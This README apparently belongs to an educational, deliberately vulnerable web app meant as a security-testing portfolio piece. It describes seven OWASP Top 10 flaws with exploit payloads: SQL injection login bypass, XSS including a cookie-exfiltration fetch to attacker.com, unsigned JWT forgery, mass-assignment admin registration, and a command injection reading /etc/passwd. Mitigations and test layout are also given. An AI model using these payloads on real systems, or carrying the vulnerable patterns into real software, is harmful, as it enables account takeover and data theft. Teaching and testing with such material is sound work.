# Security Testing Demo Project

> A vulnerable web application designed to demonstrate security testing skills and knowledge of OWASP Top 10 vulnerabilities.

## Disclaimer

**This application contains intentional security vulnerabilities for educational and demonstration purposes only!**
- DO NOT deploy this to production
- DO NOT use in any real-world application
- Only use in controlled, isolated environments

##  Purpose

This project showcases practical knowledge of:
- Identifying common web vulnerabilities
- Understanding security exploitation techniques
- Demonstrating penetration testing skills to potential employers
- OWASP Top 10 security risks

## Quick Start

### Prerequisites
- Node.js (v14 or higher)
- npm or yarn
- Git

### Installation & Setup

```bash
# Clone the repository
git clone <repository-url>
cd juice-shop

# Install dependencies
npm install

# Install Playwright browsers (required for testing)
npx playwright install

# Start the vulnerable application
npm start

# In a separate terminal, run baseline security tests
npm run test:e2e
```

The application will be available at `http://localhost:3000`

### Quick Test Overview

```bash
# Safe tests (always run these)
npm run test:e2e          # Browser-based security testing
npm run test:api          # API endpoint security validation
npm run test:ml-anomaly   # ML-based anomaly detection

# Interactive debugging
npm run test:ui           # Visual test execution and debugging

# Advanced security testing (controlled environments only)
npm run test:vuln         # Vulnerability demonstrations (opt-in)
npm run test:secure       # Security expectation validation
```

## Project Structure

### Core Application
```
.
├── package.json                 # Dependencies and scripts
├── playwright.config.ts          # Playwright test configuration
├── server.js                    # Vulnerable Express.js application
├── public/                      # Static web assets
│   └── index.html              # Main application UI
└── README.md                   # This documentation
```

### Test Architecture
```
test/
├── global-setup.ts              # Test environment initialization
├── global-teardown.ts           # Test environment cleanup
├── fixtures/                    # Shared test utilities
│   ├── e2e-fixtures.ts         # Browser-based test fixtures
│   └── ml-anomaly-fixtures.ts  # ML anomaly detection fixtures
├── pages/                       # Page Object Model classes
│   ├── HomePage.ts             # Homepage interactions
│   ├── LoginPage.ts            # Authentication flows
│   ├── RegistrationPage.ts     # User registration
│   ├── SearchPage.ts           # Search functionality
│   ├── AdminPage.ts            # Admin panel operations
│   └── IDORPage.ts             # IDOR vulnerability testing
├── utils/                       # Testing utilities
│   ├── AttackPatternDetector.ts # ML attack pattern detection
│   ├── BehaviorAnalyzer.ts     # User behavior analysis
│   ├── MLModelValidator.ts     # ML model validation
│   └── TrafficAnalyzer.ts      # Network traffic analysis
├── api/                         # API-level security tests
│   ├── api.spec.ts            # General API functionality
│   ├── authentication.spec.ts # JWT and auth bypass tests
│   ├── idor.spec.ts           # Insecure Direct Object Reference
│   └── vulnerabilities.spec.ts # Combined API vulnerability tests
├── e2e/                         # Browser-based security tests
│   ├── authentication.spec.ts # Browser auth flows and bypasses
│   ├── home.spec.ts           # Homepage and navigation
│   ├── idor.spec.ts           # IDOR via browser interface
│   ├── login.safe.spec.ts     # Safe login functionality
│   ├── registration.spec.ts   # User registration and validation
│   ├── search.spec.ts         # Search with XSS demonstrations
│   ├── sensitiveData.spec.ts  # Data exposure testing
│   ├── vulnerabilities.spec.ts # Chained exploit demonstrations
│   └── xss.spec.ts            # Cross-site scripting tests
├── ml-anomaly/                  # Machine Learning anomaly detection
│   ├── attack-patterns.spec.ts # ML-based attack detection
│   ├── baseline-behavior.spec.ts # Normal user behavior patterns
│   ├── behavioral-anomalies.spec.ts # Behavioral anomaly detection
│   ├── ml-validation.spec.ts   # ML model performance validation
│   ├── traffic-patterns.spec.ts # Network traffic analysis
│   └── README.md              # ML testing documentation
└── seed.spec.ts                 # Test data initialization
```

## Automated Testing with Playwright

This project includes comprehensive Playwright test suites with advanced ML-based anomaly detection, organized similar to OWASP Juice Shop but with modern tooling.

### Test Architecture Principles

1. **Three-Tier Testing Model**:
   - **Baseline Tests** (always safe for CI): Functional testing and smoke tests
   - **Security Expectation Tests** (post-hardening validation): Tests that should pass after security fixes
   - **Vulnerability Demonstration Tests** (opt-in only): Explicit exploit demonstrations

2. **Separation of Concerns**:
   - **API Tests** (`test/api/`): Direct HTTP endpoint testing for rapid feedback
   - **E2E Tests** (`test/e2e/`): Full browser-based testing for realistic attack scenarios
   - **ML Anomaly Tests** (`test/ml-anomaly/`): Machine learning-based attack pattern detection

3. **Page Object Model**: Maintainable test code with reusable page interaction classes

4. **Fixture-Based Architecture**: Shared test utilities for consistent setup and teardown

### Running Tests

```bash
# First-time setup
npm install
npx playwright install

# === SAFE TESTS (CI-friendly) ===
# Run all baseline tests
npm test

# Run only API tests
npm run test:api

# Run only E2E tests  
npm run test:e2e

# Run ML anomaly detection tests
npm run test:ml-anomaly

# === DEVELOPMENT & DEBUGGING ===
# Interactive UI mode (recommended for development)
npm run test:ui

# Run with visible browser (debugging)
npm run test:headed

# Run with detailed tracing
npm run test:debug

# View HTML test report
npm run test:report

# === SECURITY TESTING (opt-in) ===
# Run vulnerability demonstrations (NEVER in CI)
npm run test:vuln
# Equivalent to: RUN_VULN_TESTS=1 npx playwright test

# Run security expectation tests (post-hardening)
npm run test:secure
# Equivalent to: SECURE_MODE=1 npx playwright test

# === SPECIFIC TEST SUITES ===
# Run only login-related tests
npx playwright test login

# Run only XSS tests
npx playwright test xss

# Run only IDOR tests
npx playwright test idor

# Run tests matching pattern
npx playwright test --grep "SQL injection"
```

### Test Coverage

**API Tests** (test/api/):
- SQL injection attacks on login and search endpoints
- IDOR user enumeration without authentication
- JWT forgery and weak token verification
- Configuration data exposure
- Mass assignment privilege escalation

**E2E Tests** (test/e2e/):
- Reflected XSS with multiple payloads
- SQL injection via UI forms
- Full exploit chains in browser context

### Why Playwright?

Unlike Juice Shop's Cypress + Frisby approach, Playwright provides:
- Single framework for both API and E2E testing
- Better performance and modern API
- Native TypeScript support
- Cross-browser testing capabilities

## Vulnerabilities Implemented

### 1. SQL Injection (OWASP A03)
**Location:** `/api/login` endpoint

**Vulnerability:** Direct string concatenation in SQL query without parameterization.

**Exploitation:**
```bash
# Bypass authentication
Username: admin' OR '1'='1'--
Password: anything

# Or using comment injection
Username: admin'--
Password: (leave empty)
```

**Impact:** Complete authentication bypass, unauthorized access to any account.

---

### 2. Cross-Site Scripting - XSS (OWASP A03)
**Location:** `/api/search` endpoint and search functionality

**Vulnerability:** Unsanitized user input reflected in HTML response.

**Exploitation:**
```html
<!-- Basic alert -->
<script>alert('XSS')</script>

<!-- Image tag with error handler -->
<img src=x onerror=alert('XSS')>

<!-- Cookie theft (if cookies weren't httpOnly) -->
<script>fetch('http://attacker.com?cookie='+document.cookie)</script>
```

**Impact:** Session hijacking, credential theft, malicious redirects.

---

### 3. Insecure Direct Object Reference - IDOR (OWASP A01)
**Location:** `/api/user/:id` endpoint

**Vulnerability:** No authorization checks, any user can access other users' sensitive data.

**Exploitation:**
```bash
# Access user 1's data
GET /api/user/1

# Access user 2's data
GET /api/user/2

# Access admin data
GET /api/user/3
```

**Impact:** Unauthorized access to sensitive user information including secret_data field.

---

### 4. Broken Authentication (OWASP A07)
**Location:** `/api/admin` endpoint

**Vulnerability:** Weak JWT verification using `jwt.decode()` instead of `jwt.verify()`, accepts unsigned tokens.

**Exploitation:**
```javascript
// Create a token with "none" algorithm
const fakeToken = btoa(JSON.stringify({alg:"none"})) + '.' + 
                  btoa(JSON.stringify({role:"admin",username:"attacker"})) + '.';

// Use in request
fetch('/api/admin', {
  headers: { 'Authorization': 'Bearer ' + fakeToken }
});
```

**Impact:** Complete authentication bypass, unauthorized admin access.

---

### 5. Sensitive Data Exposure (OWASP A02)
**Location:** `/api/config` endpoint

**Vulnerability:** Exposes sensitive configuration data including secret keys and API credentials.

**Exploitation:**
```bash
# Simply visit the endpoint
GET /api/config

# Returns:
{
  "secret_key": "super-secret-key",
  "api_keys": {
    "stripe": "sk_test_fake_key",
    "aws": "AKIAIOSFODNN7EXAMPLE"
  }

```

**Impact:** Exposure of secrets enabling further attacks, data breaches.

---

### 6. Mass Assignment (OWASP A04)
**Location:** `/api/register` endpoint

**Vulnerability:** Accepts arbitrary user input without validation, allows role escalation.

**ExPlaywright** - Automated browser testing and vulnerability verification
- **ploitation:**
```bash
# Register as admin
POST /api/register
Content-Type: application/json

{
  "username": "hacker",
  "password": "password123",
  "email": "hacker@evil.com",
  "role": "admin"
}
```

**Impact:** Privilege escalation, unauthorized admin access.

---

### 7. Command Injection (Simulated)
**Location:** `/api/ping` endpoint

**Vulnerability:** Unsanitized user input used in system commands.

**Exploitation:**
```bash
# Command chaining
GET /api/ping?host=localhost;cat /etc/passwd

# Or with pipes
GET /api/ping?host=localhost | whoami
```

**Impact:** Remote code execution, complete system compromise (in production scenario).

---

## Testing Tools

Recommended tools for testing these vulnerabilities:

- **Burp Suite** - Intercept and modify requests
- **OWASP ZAP** - Automated vulnerability scanning
- **SQLMap** - Automated SQL injection testing
- **Postman** - API endpoint testing
- **Browser DevTools** - XSS and client-side testing
- **JWT.io** - JWT token manipulation

## Learning Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) (the inspiration)
- [HackerOne Hacktivity](https://hackerone.com/hacktivity)

## Mitigation Strategies

For each vulnerability, here's how to fix it:

### SQL Injection
```javascript
// Use parameterized queries
db.get('SELECT * FROM users WHERE username = ? AND password = ?', 
  [username, password], callback);
```

### XSS
```javascript
// Sanitize output
const sanitized = escapeHtml(userInput);
// Use Content-Security-Policy headers
// Validate and encode all user input
```

### IDOR
```javascript
// Implement proper authorization
if (req.user.id !== requestedUserId && req.user.role !== 'admin') {
  return res.status(403).json({ error: 'Forbidden' });
}
```

### Broken Authentication
```javascript
// Properly verify JWT tokens
jwt.verify(token, SECRET_KEY, { algorithms: ['HS256'] });
// Implement proper session management
```

### Sensitive Data Exposure
```javascript
// Never expose configuration endpoints
// Use environment variables
// Implement proper access controls
```

### Mass Assignment
```javascript
// Whitelist allowed fields
const allowedFields = ['username', 'password', 'email'];
const userData = pick(req.body, allowedFields);
userData.role = 'user'; // Set server-side
```

## Interview Talking Points

When presenting this project to HR/recruiters:

1. **Understanding:** Demonstrate deep knowledge of each vulnerability
2. **Exploitation:** Show how each can be exploited (ethically)
3. **Mitigation:** Explain proper fixes and security best practices
4. **Tools:** Discuss testing methodologies and tools used
5. **Impact:** Articulate business impact of each vulnerability
6. **Standards:** Reference OWASP Top 10 and industry standards

## License

MIT License - Feel free to use for educational purposes.

## About

Created as a portfolio project to demonstrate:
- Security testing expertise
- Full-stack development skills
- Understanding of web application vulnerabilities
- Practical penetration testing knowledge

**Remember:** This is for learning and demonstration only. Always practice ethical hacking and obtain proper authorization before testing any systems.
